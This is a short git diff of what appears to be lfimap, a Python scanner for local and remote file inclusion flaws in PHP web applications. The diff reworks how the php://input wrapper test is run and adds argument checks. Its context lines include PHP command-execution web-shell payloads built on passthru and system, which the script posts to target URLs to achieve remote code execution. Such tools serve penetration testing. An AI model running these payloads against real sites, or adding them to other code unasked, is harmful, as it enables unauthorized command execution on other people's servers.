@@ -342,7 +342,9 @@ def test_data(url):
 
 def test_input(url):
     if(args.postreq):
-        return
+        if(args.verbose): print("$_POST args are not LFI-able using php://input. Skipping input wrapper test...")
+    return
+
     if(args.verbose):
         print("Testing input wrapper...")
 
@@ -358,22 +360,13 @@ def test_input(url):
     posts.append("<?php echo(passthru($_GET['cmd']));?>")
     posts.append("<?php echo(system($_GET['cmd']));?>")
     
-    if(not args.postreq):
-        for i in range(len(tests)):
-            u = url.replace(args.param, tests[i])
+    for i in range(len(tests)):
+        u = url.replace(args.param, tests[i])
         
-            for j in range(len(posts)):
-                res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
-                if(init(res, 'POST', 'RCE', u, posts[j], headers, 'INPUT')):
-                    return
-    else:
-        for i in range(len(tests)):
-            postTest = args.postreq.replace(args.param, tests[i])
-
-            for j in range(len(posts)):
-                res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
-                if(init(res, 'POST', 'RCE', url, posts[j], headers, 'INPUT')):
-                    return
+        for j in range(len(posts)):
+            res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
+            if(init(res, 'POST', 'RCE', u, posts[j], headers, 'INPUT')):
+                return
     return
 
 
@@ -952,7 +945,11 @@ if(__name__ == "__main__"):
             sys.exit(-1)
     else:
         if(args.param not in args.postreq):
-            print("[-] '" + args.param + "' is not found in POST request. Please specify it inside -D parameter. Exiting...\n")
+            print("[-] '" + args.param + "' is not found in POST data. Please specify it inside '-D' parameter. Exiting...\n")
+            sys.exit(-1)
+        
+        if(args.param in args.url):
+            print("[-] Cannot do POST and GET mode testing at once. '-D' is specified for POST testing with '" +args.param + "' in URL. Exiting...\n")
             sys.exit(-1)
 
     if(args.test_all or args.rfi):
@@ -960,7 +957,7 @@ if(__name__ == "__main__"):
             print("[-] Please run lfimap as admin/root for RFI test. Exiting...")
             sys.exit()
         if(not args.lhost):
-            print("[!] Lfimap will try to test RFI using remote site. If target is in your network, specify '--lhost' parameter for local web server file inclusion\n")
+            print("[!] Lfimap will try to test RFI using remote site. If target is in your network, specify '--lhost' parameter for local web server file inclusion.\n")
 
     
     #If testing using GET this checks if provided URL is valid
